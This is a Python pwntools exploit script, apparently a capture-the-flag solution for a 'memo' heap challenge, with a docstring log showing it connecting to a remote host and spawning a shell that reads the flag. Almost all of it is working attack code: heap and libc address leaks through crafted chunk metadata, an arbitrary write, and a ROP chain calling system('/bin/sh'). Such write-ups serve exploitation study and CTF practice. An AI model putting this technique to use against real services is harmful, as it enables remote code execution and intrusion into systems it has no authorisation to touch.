#!/usr/bin/python

from pwn import *

"""
root@PrivLin:~/m# python sol.py 
[!] Couldn't find relocations against PLT to get symbols
[*] '/root/m/memo'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] '/root/m/memo_libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 54.202.7.144 on port 8888: Done
heap_base: 0x2203000
stack_leak: 0x7ffd769fd740
libc: 0x7f42a5801740
[*] Switching to interactive mode

$ ls /home
memo
$ cat /home/memo/flag
bkp{you are a talented and ambitious hacker}
[*] Got EOF while reading in interactive
$  
"""



e = ELF("./memo")
l = ELF("./memo_libc.so.6")

def menu():
    r.recvuntil(">> ")

def create_memo(idx, length, content):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("Index: ", str(idx))
    r.sendlineafter("Length: ", str(length))
    if length > 0x20:
        r.sendafter("memo though\n", content)
    else:
        r.sendafter("Message: ", content)

def edit_last_memo(content):
    r.sendlineafter(">> ", "2")
    r.sendafter("Edit message: ", content)
    r.recvuntil("message!\n")
    leak = u64(r.recvline().strip().ljust(8, "\x00"))
    return leak

def view_memo(idx):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("Index: ", str(idx))
    r.recvuntil("View Message: ")
    content = r.recvuntil("\n\n")
    return content[:-2]

def delete_memo(idx):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("Index: ", str(idx))

#r = process("./memo")
r = remote("54.202.7.144", 8888)

r.sendlineafter("What's user name: ", "A")
r.sendlineafter("(y/n) ", "y")
r.sendafter("Password: ", "\x00"*0x18 + "\x31")

create_memo(3, 32, "A")
create_memo(2, 32, "A")
leak = edit_last_memo("B")
heap_base = leak & ~0xfff
print "heap_base:", hex(heap_base)

delete_memo(2)
delete_memo(3)
create_memo(3, 1024, "A"*0x28 + p64(0x31) + p64(0x602a50))
create_memo(2, 32, "A")
create_memo(0, 32, p64(0x0000002000000020)+p64(0x0000000000000020)+p64(0x602a60)+p64(0x602a98))

_stack_leak = view_memo(1)
_stack_leak = u64(_stack_leak.ljust(8, "\x00"))
print "stack_leak:", hex(_stack_leak)

edit_last_memo(p64(0x0000002000000020)+p64(0x0000000000000020)+p64(0x602a60)+p64(0x601fb0))
_libc = view_memo(1)
_libc = u64(_libc.ljust(8, "\x00"))
print "libc:", hex(_libc)

libc_base = _libc - 0x20740
system = libc_base + 0x45380
bin_sh = libc_base + next(l.search("/bin/sh\x00"))
pop_rdi = 0x0000000000401263

p = p64(pop_rdi) + p64(bin_sh) + p64(system)

edit_last_memo(p64(0x0000002000000020)+p64(0x0000000000000020)+p64(_stack_leak + 0x18))
edit_last_memo(p)


r.interactive()
r.close()
